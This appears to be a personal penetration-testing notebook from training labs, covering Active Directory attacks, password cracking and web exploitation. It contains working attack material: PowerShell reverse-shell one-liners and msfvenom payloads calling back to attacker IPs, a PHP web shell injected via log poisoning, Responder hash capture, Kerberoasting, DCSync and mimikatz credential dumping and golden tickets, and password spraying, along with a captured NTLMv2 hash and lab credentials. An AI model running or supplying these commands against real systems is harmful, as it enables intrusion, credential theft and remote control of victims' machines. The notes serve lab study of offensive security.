# Overall
Tool based category

# OSINT  
- https://haveibeenpwned.com/
- https://www.dehashed.com/

# install
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

---

# Traning
# GOAD
https://github.com/Orange-Cyberdefense/GOAD

---
# OSINT
# spiderfoot
https://github.com/smicallef/spiderfoot



---
# LDAP Pass-back Attacks
```zsh
$ nc -lvp 389
$ sudo dpkg-reconfigure -p low slapd
```
- olcSaslSecProps.ldif
```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

# Seatbelt
https://github.com/GhostPack/Seatbelt


# sslstrip
https://github.com/moxie0/sslstrip

# PowerSploit
https://github.com/PowerShellMafia/PowerSploit
---

# Misc
# Hashcat
```zsh
$ hashcat -m 13100 bob_tgs /usr/share/wordlists/rockyou.txt
# -> account test with crackmapexec
$ hashcat -m 5600 era_ntlmv2 /usr/share/wordlists/rockyou.txt
```

# John

--

# PsExec
```powershell
PS> psexec64.exe \\MACHINE_IP -u TestAdminUser -p TestAdminPassword -i cmd.exe
```

# WinRM
```powershell
PS> winrs.exe -u:TestAdminUser -p:TestAdminPassword -r:TargetIP_or_Hostname cmd
```

# Windows Built-in
## Powershell
```powershell
PS> $username = 'TestAdminUser'
PS> $password = 'TestAdminPassword'
PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
# access
PS> Enter-PSSession -Computername TARGET -Credential $credential
## or
PS> Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

## sc.exe
```powershell
PS> sc.exe \\TARGET create TestService binPath= "net user TestUser TestPassword /add" start= auto
PS> sc.exe \\TARGET start TestService
PS> sc.exe \\TARGET stop TestService
PS> sc.exe \\TARGET delete TestService
```
---

# Initial Enumeration

# tcpdump
```zsh
$ sudo tcpdump -i ens224 
```

# Responder
```zsh
$ sudo responder -I ens224 -A 
```

# Inveigh
## powershell
```powershell
PS> Import-Module .\Inveigh.ps1
PS> (Get-Command Invoke-Inveigh).Parameters
PS> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
# c# exe
```powershell
PS> .\Inveigh.exe
```

# kerbrute
```zsh
sudo git clone https://github.com/ropnop/kerbrute.git
make help
$ sudo make all
$ ls dist/
$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
$ kerbrute userenum -d HOGE.com --dc 172.16.0.10 mylist.txt -o valid_ad_users
```

---

# Sighting In, Hunting For A User
# crackmapexec
```zsh
$ crackmapexec smb -h
$ crackmapexec smb 172.16.0.10 -u bob -p Password123 --pass-pol
$ crackmapexec smb 172.16.0.10 --users
```

# rpcclient
```zsh
$ rpcclient -U "" -N 172.16.0.10
rpcclient $> querydominfo
rpcclient $> enumdomusers
```
```zsh
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.0.10 | grep Authority; done
```

# enum4linux
```zsh
$ enum4linux -P 172.16.0.10
$ enum4linux -U 172.16.0.10 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```


# enum4linux-ng
```zsh
$ enum4linux-ng -P 172.16.0.10 -oA my_output
$ cat my_output.json
```

# buit-in
```zsh
$ net use \\DC01\ipc$ "" /u:""
```


# ldapsearch
```zsh
$ ldapsearch -h 172.16.0.10 -x -b "DC=HOGE,DC=COM" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

# windapsearch
```zsh
$ ;/windapsearch.py -h
$ ./windapsearch.py --dc-ip 172.16.0.10 -u "" -U
```

---
# Enumerating Security Controls
# bult-in
```powershell
PS> Get-MpComputerStatus
PS> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
PS> Find-LAPSDelegatedGroups
PS> Find-AdmPwdExtendedRights
PS> Get-LAPSComputers
```

---

# GetUserSPNs.py
```zsh
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo
or
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo r-request
or
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob
or
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob -outputfile bob_tgs
# -> Hashcat
```

# Metasploit
```zsh
$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

# crackmapexec
```zsh
$ sudo crackmapexec smb 172.16.0.10 -u sqldev -p database!
```

# setspn.exe
```zsh
$ setspn.exe -Q */*
```

# noPac
```zsh
$ git clone https://github.com/Ridter/noPac
```

# TOC
- [setup](#setup)
- [RDP](#rdp)
- [AD](#ad)

---

https://github.com/GhostPack/Seatbelt  
https://github.com/funoverip/mcafee-sitelist-pwd-decryption  
https://github.com/wavestone-cdt/powerpxe/blob/master/PowerPXE.ps1  
https://github.com/wavestone-cdt/powerpxe/tree/master
https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/
https://github.com/cube0x0/CVE-2021-1675/tree/main
https://pypi.org/project/requests-ntlm/

# setup
- impacket
```
$ pa3
$ pip install impacket
# test
$ secretsdump.py -h
$ which secretsdump.py
```
- python
```zsh
$ pip install requests-ntlm
```

-slapd(OpenLDAP)
```zsh
$ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```


 remmina -c rdp://gemma.lyons@thmjmp1.za.tryhackme.com




tftp -i 10.200.20.202 GET "\Tmp\x64{8A98E259-D569-4C1B-A088-986F5A8736FF}.bcd" conf.bcd

# RDP
```
$ xfreerdp /v:XXX.XXX.XXX.XXX /u:hoge-user /p:hoge-password /dynamic-resolution
```
`/dynamic-resolution` option may not work well.

---


http://94.237.54.59:49550/index.php?page=php://filter/read=convert.base64-encode/resource=index

echo "~~~" | base64 -d | grep ".php"

access to : ilf_admin/index.php"

no ... ffuf -w -u http://94.237.54.59:49550/ilf_admin/index.php?log=FUZZ

$ sudo nmap 94.237.54.59 -p49550 -sV

http://94.237.54.59:49550/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log

 curl -s "http://94.237.54.59:49550/index.php" -A '<?php system($_GET["cmd"]); ?>'
 
http://94.237.54.59:49550/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log&cmd=id

94.237.56.76:47450

http://94.237.56.76:47450/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log

<?php system($_GET["cmd"]); ?>

User-Agent: <?php system($_GET['cmd']); ?>


sudo ip link delete tun0



# Reverse
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Host1
172.16.1.11:8080

Host2
blog.inlanefreight.local

Host3
172.16.1.13

nmap 172.16.1.11 -A -sV -sC -p8080

set TARGETURI /manager/html
set HttpPassword Tomcatadm
set HttpUsername tomcat
set LHOST 172.16.1.5
set RHOSTS 172.16.1.11
set RPORT 8080

curl -X POST 'http://172.16.1.11:8080/webshell/api' --data "action=exec&cmd=id"

{"stdout":"uid=0(root) gid=0(root) groups=0(root)\n","stderr":"","exec":["/bin/bash","-c","id"]}

msfvenom -l payloads
msfvenom -p java/jsp_shell_reverse_tcp --list-options
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > shell.war



nmap 172.16.1.12 -A -sV -sC -p80
nmap 172.16.1.12 -A -sV -sC -p8080

search 50064.rb
https://www.exploit-db.com/exploits/50064


172.16.1.11:8080/shell

sudo nc -lvnp 4444

cp ~/Downloads/50064.rb /usr/share/metasploit-framework/modules/my/50064.rb
msfconsole -m /usr/share/metasploit-framework/modules/

manual payload download
/usr/share/metasploit-framework/modules/exploits
/usr/share/metasploit-framework/modules/auxiliary
I try. only above folder can be impacted to search and use command

msf6 > reload_all


admin:admin123!@#

---------------------------------------------------------------------

nmap 172.16.1.13 -A -sV -sC -p-

$nmap 172.16.1.13 -A -sV -sC -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-12 19:58 EST
Nmap scan report for 172.16.1.13
Host is up (0.00093s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 172.16.1.13 - /
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e4:41 (VMware)
| smb2-time:
|   date: 2023-12-13T01:03:21
|_  start_date: 2023-12-13T00:35:01
|_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-12-12T17:03:22-08:00
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 325.05 seconds
---------------------------------------------------------------------

172.16.1.13:80



Disclaimer
ForLegitUseOnly

ls C:\Users\Administrator\Desktop\

ls C:\Users\Public

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.1.5,888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

sudo nc -lvnp 888

powershell -command "Start-Process -Verb runas cmd"


if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs; exit }

set rhosts 172.16.1.13
set lhost 172.16.1.5

why ? Do I have to choose PsExec vuln, not ethernal , not web shellshouchia





Windows Version
Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber

tree c:\
tree c:\ /f | more
tree c:\ /f | Select-String "flag" -context 20, 10

File System
NTFS
icacls
icacls c:\windows
icacls c:\users


Get-Service | ? {$_.Status -eq "Running"} | select -First 2 | fl

Get-Service | ? {$_.Name -like "*pdate*"} | select -First 2 | fl

Get-Service | ? {$_.Status -eq "Running"} | echo | sls "update"

Get-Service | ? {$_.DisplayName -like "*Update*"} | select -First 4 | fl

Get-Service -Name FoxitReaderUpdateService | fl

$service = Get-Service -Name FoxitReaderUpdateService | Write-Output "Executable Path : $($service.PathName)"
... no display

https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.4
PowerShell 6.0 以降では、ServiceController オブジェクトに UserName、Description、DelayedAutoStart、BinaryPathName、StartupType の各プロパティが追加されています。

$PSVersionTable.PSVersion

xxxx : get-alias | sls "*ipconfig*"
Get-Alias | select -First 2
Get-Alias | Where-Object { $_.Name -like '*ipconfig*' }

Get-ExecutionPolicy -List

- WMI
wmic os list brief

whoami /user

Get-WmiObject Win32_Account | Select-Object SID, Name

tree c:\ /f | Select-String "Company" -context 20, 10

Get-WmiObject Win32_Share | Select-Object Name, Path
Get-SmbShare | Select-Object Name, Path


New-SmbShare -Path c:\ -Name "Company Data" -FullAccess 'Everyone'


New-Item -ItemType Directory -Path .\"Company Data"

icacls .\"Company Data"
New-SmbShare -Path .\ -Name "Company Data"

New-SmbShare -Path C:\Users\htb-student\"Company Data" -Name "Company Data" -FullAccess 'Everyone'

##
# Specify the path for the new shared folder
$sharedFolderPath = 'C:\Users\htb-student\Company Data'

# Specify the name for the new shared folder
$shareName = 'YourShareName'

# Create a new shared folder
New-SmbShare -Path $sharedFolderPath -Name $shareName -ReadAccess 'Everyone'



#####
# Specify the username and password for the new user
$username = 'Jim'
$password = ConvertTo-SecureString 'YourPassword' -AsPlainText -Force

# Create a new local user
New-LocalUser -Name $username -Password $password -FullName 'Jim' -Description 'Description of the new user' -AccountNeverExpires




##
# Specify the name of the security group
$groupName = 'HR'

# Create a new local security group
New-LocalGroup -Name $groupName -Description 'HR Department'

##
# Specify the username and group name
$username = 'Jim'; $groupName = 'HR'; Add-LocalGroupMember -Group $groupName -Member $username


##
# Specify the shared folder path and name
$sharedFolderPath = 'C:\Users\htb-student\Company Data'; $shareName = 'YourShareName'

# Specify the security group name
$securityGroupName = 'HR'

# Remove the default group from the share permissions
Remove-SmbShare -Name $shareName -Force

# Create a new shared folder with specific permissions
New-SmbShare -Path $sharedFolderPath -Name $shareName -ChangeAccess $securityGroupName -ReadAccess $securityGroupName

# Add the security group to the existing shared folder
Add-SmbShareAccess -Name $shareName -AccountName $securityGroupName -AccessRight Change

I apologize for the confusion. The Add-SmbShareAccess cmdlet is available on Windows Server editions and not on regular Windows client editions. If you are using a Windows client version, you can use the net share and icacls commands to achieve the same result.

net share $shareName=$sharedFolderPath "/grant:$securityGroupName,change"

# Disable inheritance before setting specific NTFS permissions
icacls $sharedFolderPath /inheritance:r

# Set NTFS permissions using icacls
icacls $sharedFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"


## next
# Specify the path to the HR subfolder
# Specify the security group name
# Remove the default group from NTFS permissions
# Disable inheritance before setting specific NTFS permissions
# Set NTFS permissions using icacls
$subFolderPath = 'C:\Users\htb-student\Company Data\HR'; $securityGroupName = 'HR'; icacls $subFolderPath /remove "Users"; icacls $subFolderPath /inheritance:r; icacls $subFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"

##
# List SIDs for local users
Get-WmiObject Win32_UserAccount | Select-Object Name, SID

# List SIDs for local groups
Get-WmiObject Win32_Group | Select-Object Name, SID


Get-Service

Get-Service | ? {$_.DisplayName -like "*Update*"}



# URL
https://zsh-prompt-generator.site/
https://bash-prompt-generator.org/

- shell
https://explainshell.com/

- Windows Server Core
https://learn.microsoft.com/ja-jp/windows-server/administration/server-core/what-is-server-core

- Get-Service
https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.4

- vnstat command
https://humdi.net/vnstat/

- EyeWitness
EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
https://github.com/RedSiege/EyeWitness
https://www.christophertruncer.com/eyewitness-2-0-release-and-user-guide/

- DREAD_(risk_assessment_model)
https://en.wikipedia.org/wiki/DREAD_(risk_assessment_model)

- Nessus Attack Scripting Language
https://en.wikipedia.org/wiki/Nessus_Attack_Scripting_Language

- Filesystem Hierarchy Standard (FHS)
https://www.pathname.com/fhs/


# file index number  - inode
```
htb-student@nixfund:/etc$ stat sudoers
  File: sudoers
  Size: 755             Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 147627      Links: 1
Access: (0440/-r--r-----)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-01-01 08:21:19.971766710 +0000
Modify: 2018-01-18 00:08:16.000000000 +0000
Change: 2021-08-03 12:08:36.494845988 +0000
 Birth: -
htb-student@nixfund:/etc$ ls -i sudoers
147627 sudoers
htb-student@nixfund:/etc$
```

#
```
$ find / -name *.conf* -type f -size +25k -size -28k -newermt 2020-03-03 2>/dev/null
$
$ find / -name "*.bak" 2>/dev/null
```

#
```zsh
$ find / -name *.log 2>/dev/null | wc -l
$ apt list --installed | wc -l
$ dpkg -l
$ dpkg -l | grep ^ii | wc -l
```

```zsh
$ cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
```

# column command
column command might be useful for a dman diplay of volatility 3
```zsh
$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t

root         x  0     0      root               /root        /bin/bash
sync         x  4     65534  sync               /bin         /bin/sync
mrb3n        x  1000  1000   mrb3n              /home/mrb3n  /bin/bash
```

# netstat and ss
```
$ netstat -tuln
$ ss -tuln
$ ss -tuln4 | grep LISTEN | grep -v 127.0.0.1 | wc -l

-t: Show TCP connections.
-u: Show UDP connections.
-l: Show only listening sockets.
-n: Show numerical addresses instead of resolving hostnames.
-4: IPv4
```

```
$ systemctl list-units --type=service
```

What is the type of the service of the "syslog.service"?
As for the type of service, systemd categorizes services into different types, such as "simple," "forking," "oneshot," "dbus," etc. The type of the "syslog.service" would depend on how the syslog daemon is managed by systemd.

systemctl show -p Type syslog.service





# AD
## NTLM poisoning
nmap -A -p- 172.16.5.5
fping -asgq 172.16.5.0/23
nmap -sV -p- 172.16.5.130
nmap -sV -p- 172.16.5.225


sudo responder -I ens224

ls /usr/share/responder
ls /usr/share/responder/logs
ls /usr/share/wordlists/


less /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.130.txt
less /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.130.txt | grep backup

echo "backupagent::INLANEFREIGHT:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash

# Hashcat
```zsh
$ hashcat -m 5600 ./backupagent_hash /usr/share/wordlists/rockyou.txt
$ hashcat -m 13100 SAPService_tgs /usr/share/wordlists/rockyou.txt
```

$ rpcclient -U "" -N XXX.XXX.XXX.XXX
> querydominfo
> getdompwinfo

## Enumerating Users with Kerbrute
### Kerbrute User Enumeration
$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt

$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt > result.txt


$ cat result.txt | awk -F " " '{printf("%s\n", $7)}' | grep @ | sed 's/@inlanefreight\.local//' > valid_users.txt



# Internal Password Spraying - from Windows
PS > Import-Module .\DomainPasswordSpray.ps1
PS > Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue

# rpcclient
# https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
# https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/
```zsh
$ rpcclient -U "" -N 172.16.5.5 -c "queryuser 1170"
$ rpcclient -U "" -N 172.16.5.5 -c "enumdomgroups" > a.txt
$ grep Intern a.txt
group:[Interns] rid:[0xff0]
$ echo $((16#ff0))
4080
```


## BloodHound
```zsh
$ neo4j console start
```
```zsh
$ bloodhound --no-sandbox
```
```powershell
PS> .\SharpHound.exe -c All --zipfilename hoge
PS> BloodHound.exe
# On GUI
## deault credential : neo4j / neo4j
## Upload Data ... zip file
## Check ... Analysis Tab
```

## PowerView  
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

## Snaffer  
https://github.com/SnaffCon/Snaffler  
```powershell
PS> Snaffler.exe -s -d hoge.local -o snaffler.log -v data
```
## Dsquery  
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)  
```powershell
PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr description
PS> dsquery * domainroot -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr description
```

# keberousting
user: user1
password: password1
```zsh
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/user1
[ENTER PASSWORD] password1
``````
```zsh
# test
$ sudo crackmapexec smb 172.16.5.5 -u SAPService_tgs -p !SapperFi2
-bash: !SapperFi2: event not found
$
$ set +H
$ sudo crackmapexec smb 172.16.5.5 -u SAPService -p !SapperFi2 --groups
```

python3 windapsearch.py --dc-ip 172.16.5.5 -u SAPService@inlanefreight.local -p !SapperFi2 -PU


net user %username%

psexec.py inlanefreight.local/SAPService:'!SapperFi2'@172.16.5.5

smbclient -U SAPService -N 172.16.5.5

# smbmap
```zsh
smbmap -u hoge_user -p hoge_password -d HOGE.LOCAL -H XXX.XXX.XXX.XXX
```

sudo bloodhound-python -u 'SAPService' -p 'SapperFi2' -ns 172.16.5.5 -d inlanefreight.local -c all

# setspn
```powershell
PS> setspn.exe -Q */*
PS> setspn.exe -Q vmware/inlanefreight.local
```

## targeting single user
```powershell
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local:1433"
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local"
```

# mimikatz
https://github.com/ParrotSec/mimikatz
```powershell
PS> mimikatz.exe
mimikatz # privilege::debug
mimikatz # base64 /out:true
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # kerberos::list /export
mimikatz # kerberos::golden /user:TestUsername /domain:HOGE.com /sid:DomainSid /rc4:TargetPasswordHash /target:TargetFqdn /service:ServiceName /ptt
mimikatz # kerberos::golden /user:FakeOKTestUsername /domain:HOGE.com /sid:DomainSid /krbtgt:KrbtgtPasswordHash /ptt
```


```zsh
$ echo "dsaffadsfdsafsf==" | tr -d \\n < result.txt
$ cat result.txt | base64 -d > sqldev.kirbi
$ pa2
$ python ./kirbi2john.py sqldev.kirbi
$ cat crack_file
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
$ cat sqldev_tgs_hashcat
$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

```ps
PS> Find-InterestingDomainAcl
PS> Import-Module .\PowerView.ps1
# user : forend
PS> $sid = Convert-NameToSid forend
PS> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
PS> Get-DomainGroup -Identity "Dagmar Payne" | select memberof
PS> $itgroupsid = Convert-NameToSid "Information Technology"
PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose

Get-DomainObjectACL | ? {$_.SecurityIdentifier -eq $sid} -Verbose

Allow-All

```

# DCSync
```ps
# user: hoge
PS> Get-DomainUser -Identity hoge | select samaccountname,objectsid,memberof,useraccountcontrol |fl
# get sid
PS> sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
```zsh
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
$ ls inlanefreight_hashes*
```
```ps
PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
PS> Import-Module .\PowerView.ps1
PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
```zsh
$ cat inlanefreight_hashes.ntds.cleartext
```

Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol


Academy_student_AD!

# Tools of the Trade

Many of the module sections require tools such as open-source scripts or precompiled binaries. Where applicable, these can be found in the `C:\Tools` directory on the Windows hosts provided in the sections aimed at attacking from Windows. In sections that focus on attacking AD from Linux we provide a Parrot Linux host customized for the target environment as if you were an anonymous user with an attack box within the internal network. All necessary tools and scripts will be preloaded on this host.  Here is a listing of many of the tools that we will cover in this module:
 
| Tool              | Description |  
| ----------------- | ----------- |  
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |  
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) database for graphical analysis of the AD environment. |  
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. |  
| [BloodHound.py](https://github.com/fox-it/BloodHound.py) |  A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a non-domain joined attack box. The output can be ingested into the BloodHound GUI for analysis. |  
| [Kerbrute](https://github.com/ropnop/kerbrute)  | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing. |  
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket)  |  A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. |  
| [Responder](https://github.com/lgandx/Responder) | Responder is a purpose built tool to poison LLMNR, NBT-NS and MDNS, with many different functions. |  
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. |  
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh) | The C# version of Inveigh with with a semi-interactive console for interacting with captured data such as username and password hashes. |  
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.  |    
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec)  | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL. |  
| [Rubeus](https://github.com/GhostPack/Rubeus) |  Rubeus is a C# tool built for Kerberos Abuse.  |  
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) | Another Impacket module geared towards finding Service Principal names tied to normal users. |  
| [Hashcat](https://hashcat.net/hashcat/)           | A great hashcracking and password recovery tool. |  
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) | A tool for enumerating information from Windows and Samba systems. |  
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) | A rework of the original Enum4linux tool that works a bit differently. |  
| [ldapsearch](https://linux.die.net/man/1/ldapsearch) | Built in interface for interacting with the LDAP protocol. |  
